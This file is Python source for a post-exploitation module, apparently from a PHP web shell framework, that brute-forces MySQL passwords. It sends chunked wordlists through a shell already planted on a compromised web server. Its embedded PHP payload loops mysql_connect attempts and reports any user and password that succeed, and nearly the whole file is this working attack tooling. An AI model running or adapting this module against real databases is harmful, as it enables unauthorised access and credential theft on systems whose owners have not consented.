'''
Created on 22/ago/2011

@author: norby
'''

from core.module import Module, ModuleException
from core.vector import VectorList, Vector
import random
from math import ceil

classname = 'Sqlbrute'
 
class Sqlbrute(Module):
    '''Bruteforce sql user. 
    :audit.sqlbrute <mysql|pg> <host> <user> <local_file_list.txt>
    '''
    
    vectors = VectorList([
            Vector('shell.php', 'brute_mysql_php', """$h="%s"; $u="%s"; $w="%s"; 
foreach(split('[\n]+',$w) as $pwd) {
if(@mysql_connect($h, $u, $pwd)){
    print("+" . $u . ":" . $pwd . "\n");
    break;
}
} 
""")
            ])



    def __init__( self, modhandler , url, password):

        self.chunksize = 200

        Module.__init__(self, modhandler, url, password)
        
        
    def run( self, mode, host, user, filename):

        if mode != 'mysql':
            raise ModuleException(self.name,  "Only 'mysql' database is supported so far")

        try:
            wordlist = open(filename, 'r')
        except e:
            raise ModuleException(self.name, "Error opening %s: %s" % (filename, str(e)))

        
        wl_splitted = wordlist.read().split()
        for w in wl_splitted:
            w.strip()

        vector = self._get_default_vector2()
        if vector:
            response = self.__execute_payload(vector, [host, user, wl_splitted])
            if response != None:
                self.mprint('[%s] Loaded using \'%s\' method' % (self.name, vector.name))
                return response
            
        vectors  = self.vectors.get_vectors_by_interpreters(self.modhandler.loaded_shells)
        for vector in vectors:
            response = self.__execute_payload(vector, [host, user, wl_splitted])
            if response != None:
                self.mprint('[%s] Loaded using \'%s\' method' % (self.name, vector.name))
                return response
                
        
    def __execute_payload(self, vector, parameters):
        
        wl = parameters[2]
        chunks = int(ceil(len(wl)/self.chunksize))
        
        self.mprint('[%s] Dividing wordlist of %i words in %i chunks of %i words.' % (self.name, len(wl), chunks+1, self.chunksize))
        
        for i in range(chunks+1):
        
            startword = i*self.chunksize
            if i == chunks:
                endword = len(wl)-1
            else:
                endword = (i+1)*self.chunksize
                
            parameters[2]='\n'.join(wl[startword:endword])
        
            payload = self.__prepare_payload(vector, parameters) 
            
            response = self.modhandler.load(vector.interpreter).run(payload)
            if response:
                if response.startswith('+'):
                    return "[%s] FOUND: %s" % (self.name,response[1:])
            else:
                self.mprint("[%i] %s:%s" % (endword, parameters[1], wl[endword]))


    def __prepare_payload( self, vector, parameters ):

        if vector.payloads[0].count( '%s' ) == len(parameters):
            return vector.payloads[0] % tuple(parameters)
        else:
            raise ModuleException(self.name,  "Error payload parameter number does not corresponds")
        



    
    
    